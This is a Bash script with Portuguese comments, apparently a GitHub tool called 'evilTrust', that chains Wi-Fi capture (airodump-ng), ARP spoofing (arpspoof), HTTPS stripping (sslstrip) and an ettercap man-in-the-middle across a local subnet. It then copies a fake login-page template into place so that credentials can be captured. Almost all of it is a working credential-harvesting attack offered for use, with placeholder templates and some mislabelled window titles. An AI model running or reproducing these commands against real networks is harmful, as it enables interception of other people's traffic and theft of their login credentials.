#!/bin/bash
# Script por Jeanpseven (wrench)
# GitHub: jeanpseven

iface=""

echo -e "[*] Pressione Ctrl+C para encerrar.\n"

# Mostrar lista de interfaces numeradas
echo "[*] Lista de Interfaces Disponíveis:"
interfaces=($(airmon-ng | grep "wlan" | awk '{print $2}'))
for i in "${!interfaces[@]}"; do
  echo "[$((i+1))] ${interfaces[$i]}"
done

# Capturar a escolha do usuário
read -p "[*] Escolha a interface Wi-Fi (informe o número): " choice
iface=${interfaces[$((choice-1))]}

# Listar pastas no diretório do script
echo -e "\n[*] Pastas Disponíveis no Diretório Atual:"
folders=($(ls -d */))
for i in "${!folders[@]}"; do
  echo "[$((i+1))] ${folders[$i]}"
done

# Capturar a escolha do usuário para a pasta
read -p "[*] Escolha a pasta para colocar o site falso (informe o número): " folder_choice
selected_folder=${folders[$((folder_choice-1))]}

# Caminho completo para a pasta selecionada
site_folder=$(realpath "$selected_folder")

# Mostrar lista de templates numerados
echo -e "\n[*] Lista de Templates Disponíveis:"
templates=("template1" "template2" "template3")  # Adicione aqui os nomes dos templates
for i in "${!templates[@]}"; do
  echo "[$((i+1))] ${templates[$i]}"
done

# Capturar a escolha do usuário para o template
read -p "[*] Escolha o template para a tela falsa (informe o número): " template_choice
selected_template=${templates[$((template_choice-1))]}

airodump-ng $iface -w "$site_folder/capture" > /dev/null 2>&1 &

sleep 3

xterm -geometry 75x15+1+20 -T "evilTrust - Criando Portal de Login Falso" -e "bash -c 'arpspoof -i $iface -t 10.0.0.1 10.0.0.10'" &

sleep 2

xterm -geometry 75x15+1+40 -T "evilTrust - Redirecionando Tráfego HTTP" -e "bash -c 'sslstrip -f -k -w $site_folder/sslstrip.log'" &

sleep 2

xterm -geometry 75x15+1+60 -T "evilTrust - Iniciando MITM" -e "bash -c 'ettercap -T -q -i $iface -M arp:remote /10.0.0.1// /10.0.0.10-250//'" &

sleep 2

echo -e "\n[*] O evilTrust está ativo. Aguarde até que as credenciais sejam capturadas.\n"

# Usar o template escolhido
cp -r "$selected_template/"* "$site_folder/"

wait